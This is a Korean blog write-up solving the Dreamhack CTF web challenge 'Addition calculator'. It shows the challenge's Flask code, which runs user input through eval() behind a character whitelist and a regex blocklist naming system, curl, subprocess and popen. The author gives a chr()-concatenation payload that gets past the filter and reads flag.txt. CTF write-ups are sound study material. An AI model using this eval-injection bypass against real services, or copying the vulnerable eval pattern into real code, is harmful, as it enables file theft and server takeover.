---
title: (39) Dreamhack Addition calculator 문제 풀이
date: 2024-02-16 +09:00
categories:
  - 웹해킹
tags:
  - [웹해킹, 드림핵]
---
{% raw %}
## 문제 설명
덧셈 식을 입력하면 계산 결과를 출력하는 웹 서비스입니다. `./flag.txt` 파일에 있는 플래그를 획득하세요.
플래그 형식은 `DH{...}` 입니다.

## 문제 풀이
![](https://kyuyeop.github.io/assets/img/post/39/1.png)
사이트에 들어오면 이런게 있습니다.
![](https://kyuyeop.github.io/assets/img/post/39/2.png)
이런식으로 입력하면
![](https://kyuyeop.github.io/assets/img/post/39/3.png)
덧셈 결과가 나오는 사이트 입니다.  
  
코드를 보겠습니다.
```python
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import subprocess
import re


app = Flask(__name__)


def filter(formula):
    w_list = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
    w_list.extend([" ", ".", "(", ")", "+"])

    if re.search("(system)|(curl)|(flag)|(subprocess)|(popen)", formula, re.I):
        return True
    for c in formula:
        if c not in w_list:
            return True


@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        formula = request.form.get("formula", "")
        if formula != "":
            if filter(formula):
                return render_template("index.html", result="Filtered")
            else:
                try:
                    formula = eval(formula)
                    return render_template("index.html", result=formula)
                except subprocess.CalledProcessError:
                    return render_template("index.html", result="Error")
                except:
                    return render_template("index.html", result="Error")
        else:
            return render_template("index.html", result="Enter the value")


app.run(host="0.0.0.0", port=8000)
```
입력을 받고 간단한 필터링을 한 뒤 eval을 통해 값을 구합니다. 다른 말로는 페이로드를 필터링을 통과할 수 있게 만들면 시스템을 장악할 수 있게 된다는 뜻이기도 하죠.  
  
이번 문제는 flag.txt에 있는 것만 읽으면 되는 거니 간단하게 해결했습니다.  
  
`abcdefghihjlmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .()+` 만을 입력할 수 있다고 하는 군요. 해당 범위 안에서 아래와 같이 만들었습니다.
```python
open(chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```
따옴표와 콤마를 사용할 수 없어서 char함수로 더하는 방식으로 해결했습니다.  
  
위 내용을 입력하면
![](https://kyuyeop.github.io/assets/img/post/39/4.png)
flag가 나옵니다.
{% endraw %}